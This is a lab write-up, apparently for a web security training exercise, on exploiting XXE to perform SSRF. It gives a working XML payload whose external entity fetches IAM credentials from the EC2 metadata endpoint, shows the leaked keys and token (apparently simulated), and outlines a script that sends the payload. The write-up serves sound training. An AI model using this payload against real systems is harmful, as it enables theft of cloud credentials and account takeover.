### Lab: Exploiting XXE to perform SSRF attacks

This lab has a "Check stock" feature that parses XML input and returns any unexpected values in the response.

The lab server is running a (simulated) EC2 metadata endpoint at the default URL, which is http://169.254.169.254/. This endpoint can be used to retrieve data about the instance, some of which might be sensitive.

To solve the lab, exploit the XXE vulnerability to perform an SSRF attack that obtains the server's IAM secret access key from the EC2 metadata endpoint

_____

Analysis and Exploit:

1. Send POST request **/product/stock** with XML text
    - ```<?xml version="1.0" encoding="UTF-8"?>```  
    ```<stockCheck><productId>1</productId>```  
    ```<storeId>1</storeId></stockCheck>```
2. Modify the XML to create a payload to trigger a SSRF attack
    - ```<?xml version="1.0" encoding="UTF-8"?>```  
    ```<!DOCTYPE jito [ <!ENTITY ssrf SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin">]>```   
    ```<stockCheck><productId>&ssrf;</productId><storeId>1</storeId></stockCheck>```

"Invalid product ID: {  
"Code" : "Success",  
"LastUpdated" : "2023-04-08T19:43:44.954822447Z",  
"Type" : "AWS-HMAC",  
"AccessKeyId" : "8kR7LI2qq3NBmKUY4swF",  
"SecretAccessKey" : "5iW0A4n5c0CdRj1T43ZAooE55BiULhBIiMeUHezB",  
"Token" :   "mJ94q8HVKDn3SulXG8LCen0JnvufcgzqwOdVB9o8GyaNZftW9pxBuybCNNcK2KTmjgspUCxMwy44IBpbuh5huAYVSxulQuSP5kGUEfmM4zOkuyoIyjNiOwJ840ixBoPSFeoQInGGuSw5vwZkRkhDBFXDObenjoF7Tr4k7rcTHx67zltBuSKlNJpHu1bzWxrIvho8KjEbwIXApqkt5czDF8ddEWPUgh0iXdB82z6kTv7qUns6azQDlDB5dtSrIUro",  
"Expiration" : "2029-04-06T19:43:44.954822447Z"  
}"

_____

Script:

1. Send payload and print the sensitive information | POST **/product/stock** | params: 'xml payload'
    -  ```<?xml version="1.0" encoding="UTF-8"?>```  
    ```<!DOCTYPE jito [ <!ENTITY ssrf SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin">]>```   
    ```<stockCheck><productId>&ssrf;</productId><storeId>1</storeId></stockCheck>```
    - if "SecretAccessKey" in the response text, print the entire response text
    